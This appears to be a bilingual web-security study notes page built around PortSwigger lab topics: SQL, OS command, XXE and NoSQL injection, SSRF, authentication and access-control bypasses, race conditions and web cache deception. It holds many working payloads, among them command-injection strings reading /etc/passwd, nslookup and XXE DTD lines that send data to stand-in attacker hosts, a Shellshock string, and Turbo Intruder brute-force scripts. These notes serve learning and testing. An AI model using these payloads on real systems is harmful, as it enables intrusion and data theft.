---
title: "Server Side"
categories:
  - 技术
  - 教程
tags: [web, web Security,Server Side]
sidebar: false
outline: 2
---

# Server Side

## sql inject

### database

[databases](../cyber/WebApplication.md#database)

```bash
mysql -uusername -ppasswd
```
```bash
 mysql -h192.168.80.15 -uroot -ppasswd --skip-ssl
```

```sql
#查看版本
select version();

# 查询 MySQL 数据库的数据文件存储目录
SELECT @@basedir AS 安装目录, @@datadir AS 数据目录;

# 显示编译 MySQL 时使用的操作系统
SELECT @@version_compile_os;

#查看当前用户
select user();

#查看当前打开的数据库
select database();

#查看所有的数据库
show databases;

#打开名为mysql的数据库
use mysql;

#查看数据库中所包含的数据表
show tables;

DESC users;
select name, pass from users;
```
[sql inject](../vuln/SqlInject.md)

---

## File upload vulnerabilities

[File upload vulnerabilities](../vuln/FileVuln.md#file-upload)

[portswigger-file-upload](https://portswigger.net/web-security/file-upload)

---

## Path traversal

[Path traversal](../vuln/FileVuln.md#path-traversal)

[portswigger-file-path-traversal](https://portswigger.net/web-security/file-path-traversal)

---

## command injection

[portswigger-os-command-injection](https://portswigger.net/web-security/os-command-injection)

操作系统命令注入(**OS Command Injection**) 也称为 shell 注入(**shell injection**)，攻击者通过向应用程序传入恶意输入，使其在服务器操作系统上执行任意命令。当应用程序将用户输入**未经验证地**拼接到系统命令中时，就会发生这种攻击。

**漏洞原理**

应用程序通常会调用系统命令来完成某些功能（如文件操作、ping 检测等）。若直接拼接用户输入，攻击者就可以"注入"额外的命令。

🔴 **漏洞代码示例（Python）**

```python
import os

def ping_host(user_input
    # 危险！直接拼接用户输入
    os.system(f"ping -c 1 {user_input}")
```
**攻击演示**

| 用户输入 | 实际执行的命令 | 效果 |
|---|---|---|
| `8.8.8.8` | `ping -c 1 8.8.8.8` | 正常 ping |
| `8.8.8.8; cat /etc/passwd` | `ping -c 1 8.8.8.8; cat /etc/passwd` | 泄露系统用户文件 |
| `8.8.8.8 \| whoami` | `ping -c 1 8.8.8.8 \| whoami` | 获取当前用户身份 |

**常用的注入分隔符**

| 符号 | 含义 | 系统 |
|---|---|---|
| `;` | 顺序执行 | Linux/macOS |
| `&&` | 前一条成功后执行 | 通用 |
| `\|\|` | 前一条失败后执行 | 通用 |
| `\|` | 管道 | 通用 |
| `` ` `` | 命令替换 | Linux/macOS |
| `$(...)` | 命令替换 | Linux/macOS |
| `&` | 后台执行 | Windows |
| `\r\n` | 换行注入 | Windows |

**PoC**

```bash
productId=2|whoami #&storeId=5
productId=2&storeId=5|whoami

# & -> %26 # -> %23
productId=2&storeId=5%26whoami
productId=2%26whoami+%23&storeId=5
```

```bash
name=233&email=233%40gmail.com|sleep 10 #&subject=1
```

### blind OS command

**PoC**

*redirecting output*
```bash
& whoami > /var/www/static/whoami.txt &
||whoami+>+/var/www/images/whoami2.txt||

email=233%40gmail.com|cat /etc/passwd >> /var/www/images/output.txt #&subject=1
```
*out-of-band (OAST) techniques*
```bash
& nslookup kgji2ohoyw.web-attacker.com &
||nslookup+`whoami`.xxx.oastify.com||
|nslookup `whoami`.xxx.oastify.com #
```
---

## Authentication

[portswigger-authentication](https://portswigger.net/web-security/authentication)

**身份验证漏洞(Authentication Vulnerabilities)** 指应用或系统在确认用户、服务或设备身份的过程中存在的安全缺陷。如果身份验证机制不够安全，攻击者就可以绕过这些机制，冒充合法用户（甚至管理员）来获取未授权的访问权限。

**认证 vs 授权**

- **Authentication（认证）**：确认"你是谁"，验证用户身份是否真实。
- **Authorization（授权）**：确认"你能做什么"，验证已认证用户的访问权限。

认证是第一道门。一旦被绕过，后续基于身份的访问控制基本全部失效，因此危害通常很高。

**三种认证因素**

| 类型 | 含义 | 示例 |
|---|---|---|
| Knowledge（知识）| 你知道的东西 | 密码、PIN、安全问题 |
| Possession（持有）| 你拥有的东西 | 手机、硬件令牌、OTP |
| Inherence（固有）| 你本身的特征 | 指纹、人脸、虹膜 |

多因素认证(MFA)即组合使用两种及以上不同类型的因素。

### bypass

**IP-based brute-force protection**

```bash
X-Forwarded-For: §2§
```


**X-Forwarded-Host**

`X-Forwarded-Host` 是代理类 HTTP 头，用来记录客户端原始请求里的 `Host` 值。

- 用于维护对原始主机的引用

```bash
X-Forwarded-Host: <original-host>
```
---

## Business logic

**Business logic vulnerabilities** are flaws in the design and implementation of an application that allow an attacker to elicit unintended behavior. This potentially enables attackers to manipulate legitimate functionality to achieve a malicious goal.

### Encryption Oracle

[Encryption Oracle](../common.md#encryption-oracle) （Encryption Oracle）：
一个允许攻击者输入任意明文，并会返回对应密文的系统（或服务）。

在安全分析中，攻击者通常不知道系统内部的加密密钥（Key）和具体实现细节，但他们有办法让系统帮他们加密数据。

**PoC**

[Lab: Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)

- **block-based encryption** algorithm is used and that the input length must be a **multiple of 16**
```bash
xxxxxxxxxadministrator:your-timestamp
```
### PoC

<span style="font-size: 19px;">**利用电子邮件地址解析差异绕过访问控制**</span>

[Bypassing access controls using email address parsing discrepancies](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies)

`abcfoo@ginandjuice.shop` ⬇️

*Quoted-Printable（Q 编码）*
```txt
# 字符集 ISO-8859-1
=?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop
# 字符集 UTF-8
=?utf-8?q?=61=62=63?=foo@ginandjuice.shop
# 字符集 UTF-7
=?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop
```
`attacker@[YOUR-EXPLOIT-SERVER_ID] @ginandjuice.shop`⬇️
```html
=?utf-7?q?attacker&AEA-[YOUR-EXPLOIT-SERVER_ID]&ACA-?=@ginandjuice.shop
```
在 **UTF-7 编码规范（RFC 2152）** 中：
* `&` 是 UTF-7 字符转义的开始标记，`-` 是结束标记，中间是 **Modified Base64 编码**的 Unicode (UTF-16) 字符。
- **`&AEA-`** 代表 **`@` 符号** (Unicode `U+0040`)
   * Base64 `AEA` $\rightarrow$ 二进制 `00000000 01000000` $\rightarrow$ 十六进制 `0x0040` $\rightarrow$ **`@`**
- **`&ACA-`** 代表 **空格 ` `** (Unicode `U+0020`)
   * Base64 `ACA` $\rightarrow$ 二进制 `00000000 00100000` $\rightarrow$ 十六进制 `0x0020` $\rightarrow$ **` `（Space）**

---

## Information disclosure

**Information disclosure**, also known as **information leakage**, is when a website unintentionally reveals sensitive information to its users. 

### TRACE

HTTP `TRACE` 是一种 HTTP 请求方法，用于让服务器**回显它收到的请求内容**，主要用于调试、诊断请求在客户端到服务器之间是否被代理、网关或中间设备修改。

- `TRACE` 的作用不是获取资源或提交数据，而是让服务器把接收到的请求原样返回，以便定位网络或协议层问题
- [伪造客户端IP地址](./websecurity.md#burpsuit)

### version control history

```bash
# download .git 
wget -r https://xxx.web-security-academy.net/.git

# 查看 git状态
git status
# 简洁的一行格式查看 Git 提交历史
git log --oneline
# 切换分支或恢复文件状态
git checkout 2fb9eb5
```

## Access control

Access control is the application of constraints on who or what is authorized to perform actions or access resources. 

- **Authentication** confirms that the user is who they say they are
- **Session management** identifies which subsequent HTTP requests are being made by that same user.
- **Access control** determines whether the user is allowed to carry out the action that they are attempting to perform.

### Non-standard HTTP headers

Some application frameworks support various non-standard HTTP headers that can be used to override the URL in the original request, such as `X-Original-URL` and `X-Rewrite-URL`.If a website uses rigorous front-end controls to restrict access based on the URL, but the application allows the URL to be overridden via a request header, then it might be possible to bypass the access controls using a request like the following:

```bash
POST / HTTP/1.1
X-Original-URL: /admin/deleteUser
...
```
- `X-Original-URL` 是一个非标准的 HTTP 请求头，通常用于在经过反向代理、网关或 URL 重写组件处理后，**记录“客户端最初请求的 URL/路径”**

### Referer

`Referer` 用来表示“当前请求是从哪个页面跳转或发起过来的”。浏览器通常会对来自某个页面的请求自动添加这个头部。

## Race conditions

[Race conditions](https://portswigger.net/web-security/race-conditions) are a common type of vulnerability closely related to business logic flaws. They occur when websites process requests **concurrently** without adequate safeguards. This can lead to multiple distinct threads interacting with the same data at the same time, resulting in a "**collision**" that causes unintended behavior in the application. A race condition attack uses carefully timed requests to cause intentional collisions and exploit this unintended behavior for malicious purposes.

The period of time during which a **collision** is possible is known as the "**race window**". This could be the fraction of a second between two interactions with the database, for example.

**PoC**

*examples/race-single-packet-attack.py* 改

*Bypassing rate limits via race conditions*
```python
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```

*Partial construction race conditions*
```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: phpsessionid=YOUR-SESSION-TOKEN
Content-Length: 0

'''
    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'User' + currentAttempt
    
        # queue a single registration request
        engine.queue(target.req, username, gate=currentAttempt)
        
        # queue 50 confirmation requests - note that this will probably sent in two separate packets
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)
        
        # send all the queued requests for this attempt
        engine.openGate(currentAttempt)

def handleResponse(req, interesting):
    table.add(req)
```

## SSRF


**黑名单过滤绕过**

[SSRF](https://portswigger.net/web-security/ssrf) ([Server-side request forgery](../vuln/SSRF.md)) is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.

- `127.0.0.1` ⬇️
```txt
127.1
2130706433
017700000001
```
- 使用 URL 编码或大小写变化来混淆被屏蔽的字符串。
```txt
127.1/aDmIn

# 双重URL编码 
127.1/%25%36%31dmin
```
- 注册一个解析到 127.0.0.1 的域名

**白名单过滤**

```txt
username#@stock.weliketoshop.net

127.0.0.1%2523@stock.weliketoshop.net

localhost:80%2523@stock.weliketoshop.net/admin
```

**ShellShock**

**paylaod**
```bash
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```

---

## XXE injection

[XXE](../webapp/InjectionAttacks#xxe-injection)(**XML External Entity Injection**，**XML 外部实体注入**)是一种针对解析 XML 输入的应用程序的安全漏洞。当应用使用的 XML 解析器允许解析外部实体，且攻击者能控制 XML 输入内容时，就可能被利用。

**核心原理**

XML 支持通过 **DTD**（文档类型定义）定义实体（**entity**），实体可以引用外部资源。如果解析器没有禁用外部实体解析，攻击者就能构造恶意实体来读取文件、发起请求等。

<span style="font-size: 19px;">**Payload**</span>

*retrieve files*
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1"> ]>
```

*SSRF attacks or Blind 外部实体&*
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```
*Blind 参数实体%*
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://xxx.web-attacker.com"> %xxe; ]>
```

**malicious DTD**

*out-of-band*
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```
*error messages*
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
**Exploiting blind XXE by repurposing a local DTD**

*Locating an existing DTD file to repurpose参数实体*
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
*Payload*
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
- `file:///usr/local/app/schema.dtd`
- `custom_entity`

---

**XInclude attacks**

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
*xxe.svg*
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

## NoSQL injection

[NoSQL注入](../vuln/SqlInject.md#nosql注入) 是一种针对 NoSQL 数据库（如 MongoDB、Redis、CouchDB 等）的安全攻击手段，与传统 SQL 注入类似，但利用的是 NoSQL 数据库特有的查询语法和结构。

**🔍 基本原理**

攻击者通过操纵应用程序发送给数据库的查询，绕过认证逻辑或获取未授权数据。


## API testing

APIs (**Application Programming Interfaces**) enable software systems and applications to communicate and share data. API testing is important as vulnerabilities in APIs may undermine core aspects of a website's confidentiality, integrity, and availability.

<span style="font-size: 19px;">**PoC**</span>

OpenAPI Parser
JS Link Finder
Content type converter
Param Miner
Backslash Powered Scanne

*Discovering API documentation*
```bash
/api
/swagger/index.html
/openapi.json
```

*HTTP修改*
```bash
OPTIONS 
Content-Type: application/json
Content-Type: application/xml;charset=UTF-8
```

---

## Web cache deception

[Web cache deception](https://portswigger.net/web-security/web-cache-deception) is a vulnerability that enables an attacker to trick a web cache into storing sensitive, dynamic content. It's caused by discrepancies between how the cache server and origin server handle requests.

[Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)

*重定向*
```javascript
<script>document.location="https://vulnerable-website.com/my-account/any.js"</script>
```

<span style="font-size: 19px;">**Exploiting static extension cache rules**</span>

```html
/my-account/abc
/my-account/abc.js
/my-account;ace.js
```
<span style="font-size: 19px;">**Exploiting static directory cache rules**</span>

*源服务器规范化*
```html
/aaa/..%2fmy-account
/resources/..%2fmy-account
/resources/..%2fmy-account?wcd
```
*缓存服务器规范化*
```html
/<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>
/my-account?%2f%2e%2e%2fresources
```
<span style="font-size: 19px;">**Exploiting file name cache rules**</span>

`robots.txt`, `index.html`, and `favicon.ico`
```html
/my-account;%2f%2e%2e%2frobots.txt
```